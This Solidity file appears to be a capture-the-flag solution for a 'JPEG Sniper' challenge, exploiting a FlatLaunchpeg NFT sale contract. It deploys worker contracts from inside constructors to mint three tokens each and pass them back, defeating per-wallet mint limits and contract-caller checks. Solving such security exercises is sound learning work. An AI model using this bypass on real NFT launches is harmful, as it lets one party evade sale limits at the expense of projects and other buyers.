// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../jpeg-sniper/FlatLaunchpeg.sol";

contract SolveJPEGSniper {
  

  constructor(FlatLaunchpeg challenge) {
    for (uint256 i; i < 69/3; i++) {
      uint256 offset = 3 * i;
      SolveWorker worker = new SolveWorker(challenge, 3);
      challenge.safeTransferFrom(address(worker), msg.sender, offset);
      challenge.safeTransferFrom(address(worker), msg.sender, offset + 1);
      challenge.safeTransferFrom(address(worker), msg.sender, offset + 2);
    }
  }
}

contract SolveWorker {
  constructor(FlatLaunchpeg _challenge, uint256 amount){
    _challenge.publicSaleMint(amount);
    _challenge.setApprovalForAll(msg.sender, true);
  }
}